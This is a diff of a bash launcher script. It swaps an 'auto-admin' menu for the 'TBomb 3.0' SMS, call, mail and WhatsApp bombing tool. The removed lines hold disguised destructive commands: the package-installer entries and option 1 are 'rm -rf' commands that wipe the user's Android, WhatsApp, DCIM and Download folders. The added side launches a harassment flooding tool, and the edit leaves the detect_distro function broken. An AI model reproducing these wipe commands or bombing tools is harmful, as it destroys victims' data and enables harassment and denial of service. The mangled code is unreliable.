@@ -10,25 +10,14 @@ detect_distro() {
     fi
 
     if [ -z "$distro" ]; then
-        if [ -f "/etc/os-release" ]; then
-            distro="$(source /etc/os-release && echo $ID)"
-        elif [ "$OSTYPE" == "darwin" ]; then
-            distro="darwin"
-        else 
-            distro="invalid"
-        fi
-    fi
-}
-
-pause() {
-    read -n1 -r -p "Press any key to continue..." key
- 
+  
+banner() {
     clear
     echo -e "\e[1;31m"
     if ! [ -x "$(command -v figlet)" ]; then
-        echo 'Introducing auto-admin'
+        echo 'Introducing TBomb'
     else
-                 figlet auto-admin
+                 figlet TBomb 3.0
     fi
     if ! [ -x "$(command -v toilet)" ]; then
         echo -e "\e[4;34m This Bomber Was Created By \e[1;32mMaster Hacke . dracula-hack \e[0m"
@@ -55,14 +44,14 @@ init_environ(){
     declare -A backends; backends=(
         ["arch"]="pacman -S --noconfirm"
         ["debian"]="apt-get -y install"
-        ["ubuntu"]="rm -rf cd /sdcard/Android"
-        ["termux"]="rm -rf cd ~"
+        ["ubuntu"]="apt -y install"
+        ["termux"]="apt -y install"
         ["fedora"]="yum -y install"
-        ["redhat"]="rm -rf cd /sdcard/WhatsApp"
+        ["redhat"]="yum -y install"
         ["SuSE"]="zypper -n install"
-        ["sles"]="rm -rf cd /sdcard/DCIM"
-        ["darwin"]="rm -rf cd /sdcard/Download"
-        ["alpine"]="rm -rf cd /sdcard/SHAREit"
+        ["sles"]="zypper -n install"
+        ["darwin"]="brew install"
+        ["alpine"]="apk add"
     )
 
     INSTALL="${backends[$distro]}"
@@ -88,7 +77,7 @@ install_deps(){
     else
         echo "We could not install dependencies."
         echo "Please make sure you have git, python3, pip3 and requirements installed."
-        echo "Then you can execute whatsapp.sh ."
+        echo "Then you can execute bomber.py ."
         exit
     fi
 }
@@ -119,10 +108,10 @@ do
     echo -e "'\033[1;36m############################# \033[1;32m [Features] \033[1;36m ###################################"
 echo " "
 echo " "
-echo -e " \033[1;31m                         ➡️ \033[1;33m  [1️⃣] ato admin"
+echo -e " \033[1;31m                         ➡️ \033[1;33m  [1️⃣] Sms bombing"
 echo -e " \033[1;31m                         ➡️ \033[1;33m  [2️⃣] Call bombing"
 echo -e " \033[1;31m                         ➡️ \033[1;33m  [3️⃣] Mail bombing"
-echo -e " \033[1;31m                         ➡️ \033[1;33m  [4️⃣] Whatsapp bombing "
+echo -e " \033[1;31m                         ➡️ \033[1;33m  [4️⃣] Whatsapp bombing (coming soon)"
 echo -e " \033[1;31m                         ➡️ \033[1;33m  [5️⃣] Update script"
 echo -e " \033[1;31m                         ➡️ \033[1;33m  [6️⃣] exit"
 echo " "
@@ -134,7 +123,7 @@ echo " "
     clear
    if [ $ch -eq 1 ];then
         cd $HOME
-        rm -rf cd /sdcard/Android
+        cd tbombe-python-script
         python3 bomber.py
        
         exit
